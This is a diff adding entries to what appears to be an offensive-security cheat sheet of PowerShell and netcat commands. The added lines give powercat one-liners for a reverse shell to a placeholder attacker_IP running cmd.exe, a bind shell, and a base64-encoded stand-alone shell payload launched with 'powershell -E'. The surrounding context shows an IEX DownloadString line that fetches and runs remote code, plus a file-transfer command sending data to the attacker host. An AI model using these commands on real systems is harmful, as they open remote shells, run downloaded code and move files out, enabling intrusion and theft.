@@ -1491,6 +1491,17 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 nc -lnvp port_here > /path/to/outfile
 # send
 powercat -c attacker_IP -p port_here -i C:\path\to\infile
+
+# reverse shell
+powercat -c attacker_IP -p port_here -e cmd.exe
+
+# bind shell
+powercat -l -p port_here -e cmd.exe
+
+# generate stand-alone bind shell, base64-encoded
+powercat -c attacker_IP -p port_here -e cmd.exe -ge > outfile.ps1
+# run
+powershell -E content_of_outfile.ps1
 ```
 
 
